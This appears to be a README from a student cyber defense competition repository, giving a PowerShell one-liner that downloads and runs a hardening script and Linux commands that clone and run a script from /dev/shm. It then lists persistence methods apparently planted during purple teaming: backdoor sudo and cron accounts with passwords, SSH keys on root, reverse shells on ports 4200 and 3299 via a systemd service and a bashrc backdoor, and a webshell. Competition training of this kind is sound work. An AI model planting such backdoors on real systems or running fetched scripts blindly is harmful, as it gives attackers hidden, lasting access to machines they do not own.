## Blue Team Tools for Team Bravo

For use during the 3rd CDT competition for Fall 2025 semester. Intended to harden and setup a Windows virtual machine for threat hunting and intrusion detection. 

Linux scripts were added later when purple teaming during the final competition of the semester.

#### Running Windows Script:

iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/jaxiom/Windows-CDT-Blue-Script/refs/heads/main/windows_harden.ps1").Content

### Linux Persistence Methods
cd /dev/shm
git clone https://github.com/USERNAME/REPO.git
cd REPO
chmod +x script.sh
./script.sh

#### Persistence Methods 
1. Sudo user: username: ansibled, password:WinningCDT1!
2. Ssh key on users: root and redteam
3. Cron job: username: sql.service, password:redteamsucks
4. Reverse Shell connection open on port 4200 via systemd service
5. Reverse Shell connection open on port 3299 via bashrc backdoor
6. Webshell on http